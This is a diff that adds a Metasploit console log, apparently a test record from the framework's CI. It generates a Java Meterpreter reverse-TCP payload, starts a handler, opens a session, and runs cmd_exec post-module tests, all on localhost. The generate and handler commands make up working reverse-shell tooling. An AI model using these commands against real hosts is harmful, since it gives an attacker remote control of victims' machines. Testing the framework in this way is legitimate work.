@@ -1,0 +1,30 @@
+use java/meterpreter/reverse_tcp
+msf6 payload(java/meterpreter/reverse_tcp) > generate -o D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220204-584-c1ymsi.jar -f jar AutoVerifySessionTimeout=10 spawn=0 lport=6013 lhost=127.0.0.1
+[*] Writing 5265 bytes to D:/a/_temp/meterpreter-spec-rb-java-meterpreter-reverse-tcp20220204-584-c1ymsi.jar...
+msf6 payload(java/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 12
+msf6 payload(java/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6013 
+[*] Sending stage (58075 bytes) to 127.0.0.1
+[*] Meterpreter session 13 opened (127.0.0.1:6013 -> 127.0.0.1:50057 ) at 2022-02-04 02:00:20 +0000
+use test/cmd_exec
+msf6 post(test/cmd_exec) > run session=13 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod, stdapi_railgun_api
+[*] Running against session 13
+[*] Session type is meterpreter and platform is windows
+[*] Starting cmd_exec stderr tests
+[+] should return the stderr output
+[*] Starting cmd_exec tests
+[*] meterpreter?
+[+] should return the result of echo
+[*] Session does not support sleep, skipping sleep tests
+[*] Finished cmd_exec tests
+[*] Starting cmd_exec quote tests
+[+] should return the result of echo with single quotes
+[+] should return the result of echo with double quotes
+[*] Testing complete in 1.0262536
+[*] Passed: 4; Failed: 0
+[*] Post module execution completed
+msf6 post(test/cmd_exec) > 
